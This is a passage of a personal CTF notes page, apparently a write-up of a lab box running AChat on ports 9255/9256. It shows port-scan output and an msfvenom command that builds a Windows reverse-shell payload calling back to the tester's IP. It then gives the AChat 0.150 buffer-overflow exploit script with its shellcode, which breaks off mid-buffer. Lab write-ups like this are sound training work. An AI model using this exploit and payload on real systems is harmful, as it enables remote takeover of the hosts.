+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Brainstorm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Brainstorm
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/BufferOverFlowPrep/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    BufferOverFlowPrep
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Gatekeeper/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Gatekeeper
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Mr%20Robot/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Mr. Robot
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Skynet/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Skynet
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Untitled/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Untitled
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Vulnnet%20Roasted/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Vulnnet Roasted
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Vulnversity/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Vulnversity
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/hackpark/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Hackpark
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/internal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Internal
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/overpass2hacked/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Overpass2hacked
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/steelmountain/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Steelmountain
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/tomghost/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Tomghost
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_18" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_18" id="__nav_3_4_18_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Work in Progress
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_18_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_18">
+            <span class="md-nav__icon md-icon"></span>
+            Work in Progress
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Work%20in%20Progress/Anonymous/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Anonymous
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Work%20in%20Progress/BufferOverFlowPrep/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    BufferOverFlowPrep
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Work%20in%20Progress/Daily%20Bugle/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Daily Bugle
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Work%20in%20Progress/Ice/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Work%20in%20Progress/dogcat/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Dogcat
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Work%20in%20Progress/relevant/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Relevant
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_18_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_18_7" id="__nav_3_4_18_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Throwback
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_4_18_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_18_7">
+            <span class="md-nav__icon md-icon"></span>
+            Throwback
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Work%20in%20Progress/Throwback/10.200.70.138%20Throwback-FW01/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Throwback-FW01
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Work%20in%20Progress/Throwback/10.200.70.219%20Throwback-Prod/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Throwback-Prod
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Work%20in%20Progress/Throwback/10.200.70.232%20%20Throwback-Mail/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Throwback-Mail
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Work%20in%20Progress/Throwback/10.200.70.250/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    10.200.70.250
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Work%20in%20Progress/Throwback/10.41.0.2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    10.41.0.2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Work%20in%20Progress/Throwback/Loot/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Loot
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Work%20in%20Progress/Throwback/session%207/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Session 7
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Work%20in%20Progress/Throwback/session%208/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Session 8
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_5" id="__nav_3_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    VulnHub
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_5">
+            <span class="md-nav__icon md-icon"></span>
+            VulnHub
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Assertion%20101/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Assertion 101
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Cute/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cute
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Cybersploit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cybersploit
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/DC-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    DC-1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/DC-2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    DC-2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Dawn/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Dawn
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Decoy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Decoy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Funbox%20EasyEnum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Funbox: EasyEnum
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Funbox%20Rookie/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Funbox Rookie
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Funbox3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Funbox3
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Gaara/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Gaara
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Geisha/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Geisha
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Inclusiveness/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Inclusiveness
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Katana/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Katana
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Lampiano/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lampiao
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Monitoring/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Monitoring
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Natraj/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Natraj
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Potato/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Potato
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/PyExp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PyExp
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/SAR/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Sar
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Seppuku/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Seppuku
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Solstice/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Solstice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Sumo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Sumo
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Vegeta/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Vegeta
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Y0usef/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Y0usef
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/noontide/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Noontide
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/oscp%20prep/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OSCP prep
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/wpwn/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    wpwn
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recon
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Recon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port Scan
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#public-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      Public exploits
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#user-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      User Flag
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="User Flag">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#winpeas-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      WinPEAS findings:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privesc" class="md-nav__link">
+    <span class="md-ellipsis">
+      PrivEsc
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PrivEsc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ms16-075-rotten-potato" class="md-nav__link">
+    <span class="md-ellipsis">
+      MS16-075 - Rotten Potato
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="10101074">10.10.10.74<a class="headerlink" href="#10101074" title="Permanent link">&para;</a></h1>
+<h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<h3 id="port-scan">Port Scan<a class="headerlink" href="#port-scan" title="Permanent link">&para;</a></h3>
+<pre><code class="language-text">PORT     STATE SERVICE REASON          VERSION                                                                                                                               
+
+9255/tcp open  http    syn-ack ttl 127 AChat chat system httpd                                                                                                               |_http-title: Site doesn't have a title.                                                                                                                                     | http-methods:                                                                                                                                                              |_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                 |_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE                                                                                                        
+
+9256/tcp open  achat   syn-ack ttl 127 AChat chat system                                                                                                                     
+
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                        Device type: general purpose|phone|specialized                                                                                                                               
+
+Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|8.1|2012 (91%)                                                                                                 OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012:r2                                                                             OS fingerprint not ideal because: Missing a closed TCP port so results incomplete                                                                                            
+
+Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows 7 Professional or Windows 8 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (90%), Microsoft Windows Vista SP2 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (89%), Microsoft Windows 8.1 Update 1 (89%) 
+</code></pre>
+<p>Only 2 open ports. I guess the name <code>Chatterbox</code> is supposed to be a joke.</p>
+<p>Nothing really useful in the scan results. UDP ports are still being scanned, hopefully something comes up. Nothing came up. What on earth am I supposed to do with this box!?!?</p>
+<p>I feel like I'll need to rescan this one....or something.</p>
+<p>I reverted and re-scanned. Turns out the name <code>Chatterbox</code> is because this box is hosting AChat.</p>
+<h2 id="public-exploits">Public exploits<a class="headerlink" href="#public-exploits" title="Permanent link">&para;</a></h2>
+<p><img alt="Pasted image 20220203214656.png" src="../Pasted%20image%2020220203214656.png" /></p>
+<p>Using <a href="https://www.exploit-db.com/exploits/36025">EDB-36025</a>. Had to change line 57 to include the right IP address.
+<img alt="Pasted image 20220203215029.png" src="../Pasted%20image%2020220203215029.png" /></p>
+<p>Also need to swap out the payload - this POC just pops calc.exe
+<img alt="Pasted image 20220203215253.png" src="../Pasted%20image%2020220203215253.png" /></p>
+<p>Get new payload</p>
+<pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
+
+</code></pre>
+<p>After changing out the payload, here's the completed exploit</p>
+<pre><code class="language-python">#!/usr/bin/python                                                                                                                                                            # Author KAhara MAnhara                                                                                                                                                      # Achat 0.150 beta7 - Buffer Overflow                                                                                                                                        # Tested on Windows 7 32bit                                                                                                                                                                                                                                                                                                                               import socket                                                                                                                                                                import sys, time                                                                                                                                                                                                                                                                                                                                          buf =  b&quot;&quot;                                                                                                                                                                   buf += b&quot;\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49&quot;                                                                                                               buf += b&quot;\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41&quot;                                                                                                               buf += b&quot;\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41&quot;                                                                                                               buf += b&quot;\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51&quot;                                                                                                               buf += b&quot;\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31&quot;                                                                                                               buf += b&quot;\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41&quot;                                                                                                               buf += b&quot;\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41&quot;                                                                                                               buf += b&quot;\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41&quot;                                                                                                               buf += b&quot;\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41&quot;                                                                                                               buf += b&quot;\x47\x42\x39\x75\x34\x4a\x42\x4b\x4c\x77\x78\x44\x42&quot;                                                                                                               buf += b&quot;\x79\x70\x79\x70\x59\x70\x63\x30\x74\x49\x48\x65\x50&quot;                                                                                                               buf += b&quot;\x31\x39\x30\x50\x64\x34\x4b\x6e\x70\x6c\x70\x32\x6b&quot;                                                                                                               buf += b&quot;\x42\x32\x4c\x4c\x42\x6b\x70\x52\x4d\x44\x52\x6b\x53&quot;                                                                                                               buf += b&quot;\x42\x6c\x68\x4a\x6f\x48\x37\x4e\x6a\x6b\x76\x4d\x61&quot;                                                                                                               buf += b&quot;\x4b\x4f\x34\x6c\x6d\x6c\x73\x31\x61\x6c\x6a\x62\x6e&quot;                                                                                                               buf += b&quot;\x4c\x6b\x70\x57\x51\x36\x6f\x6c\x4d\x79\x71\x67\x57&quot;                                                                                                               buf += b&quot;\x38\x62\x4b\x42\x72\x32\x61\x47\x74\x4b\x61\x42\x6a&quot;                                                                                                               buf += b&quot;\x70\x74\x4b\x50\x4a\x4d\x6c\x52\x6b\x6e\x6c\x6e\x31&quot;                                                                                                               buf += b&quot;\x70\x78\x4b\x33\x4d\x78\x49\x71\x78\x51\x6f\x61\x62&quot;                                                                                                               buf += b&quot;\x6b\x52\x39\x6b\x70\x6b\x51\x37\x63\x32\x6b\x6f\x59&quot;                                                                                                               buf += b&quot;\x4b\x68\x69\x53\x4d\x6a\x6e\x69\x72\x6b\x30\x34\x52&quot;                                                                                                               buf += b&quot;\x6b\x6a\x61\x69\x46\x4c\x71\x59\x6f\x74\x6c\x67\x51&quot;                                                                                                               buf += b&quot;\x38\x4f\x4c\x4d\x7a\x61\x77\x57\x4d\x68\x57\x70\x34&quot;                                                                                                               buf += b&quot;\x35\x79\x66\x59\x73\x31\x6d\x78\x78\x4f\x4b\x31\x6d&quot;                                                                                                               buf += b&quot;\x6f\x34\x52\x55\x79\x54\x42\x38\x32\x6b\x30\x58\x6c&quot;                                                                                                               buf += b&quot;\x64\x6a\x61\x67\x63\x42\x46\x54\x4b\x4a\x6c\x4e\x6b&quot;                                                                                                               buf += b&quot;\x64\x4b\x72\x38\x6d\x4c\x7a\x61\x46\x73\x64\x4b\x59&quot;                                                                                                               buf += b&quot;\x74\x72\x6b\x6d\x31\x38\x50\x55\x39\x51\x34\x6c\x64&quot;                                                                                                               buf += b&quot;\x4d\x54\x6f\x6b\x6f\x6b\x51\x51\x52\x39\x6e\x7a\x72&quot;                                                                                                               buf += b&quot;\x31\x79\x6f\x47\x70\x61\x4f\x31\x4f\x61\x4a\x74\x4b&quot;                                                                                                               buf += b&quot;\x7a\x72\x7a\x4b\x44\x4d\x51\x4d\x53\x38\x6d\x63\x50&quot;                                                                                                               buf += b&quot;\x32\x59\x70\x59\x70\x52\x48\x63\x47\x31\x63\x30\x32&quot;                                                                                                               buf += b&quot;\x61\x4f\x52\x34\x30\x68\x6e\x6c\x71\x67\x6c\x66\x4d&quot;                                                                                                               buf += b&quot;\x37\x39\x6f\x36\x75\x55\x68\x74\x50\x59\x71\x59\x70&quot;                                                                                                               buf += b&quot;\x39\x70\x6e\x49\x49\x34\x62\x34\x4e\x70\x62\x48\x4d&quot;                                                                                                               buf += b&quot;\x59\x31\x70\x32\x4b\x6b\x50\x79\x6f\x56\x75\x32\x30&quot;                                                                                                               buf += b&quot;\x30\x50\x52\x30\x32\x30\x4f\x50\x52\x30\x4f\x50\x50&quot;                                                                                                               buf += b&quot;\x50\x31\x58\x69\x5a\x6c\x4f\x39\x4f\x4b\x30\x6b\x4f&quot;                                                                                                               buf += b&quot;\x6a\x35\x33\x67\x50\x6a\x6b\x55\x71\x58\x6a\x6a\x79&quot;                                                                                                               buf += b&quot;\x7a\x6e\x30\x4d\x34\x32\x48\x4c\x42\x4d\x30\x4d\x31&quot;                                                                                                               buf += b&quot;\x45\x6c\x34\x49\x58\x66\x62\x4a\x4a\x70\x6e\x76\x6f&quot;                                                                                                               buf += b&quot;\x67\x43\x38\x63\x69\x73\x75\x44\x34\x70\x61\x49\x6f&quot;                                                                                                               buf += b&quot;\x56\x75\x51\x75\x35\x70\x70\x74\x7a\x6c\x79\x6f\x4e&quot;                                                                                                               buf += b&quot;\x6e\x69\x78\x70\x75\x7a\x4c\x30\x68\x7a\x50\x48\x35&quot;                                                                                                               buf += 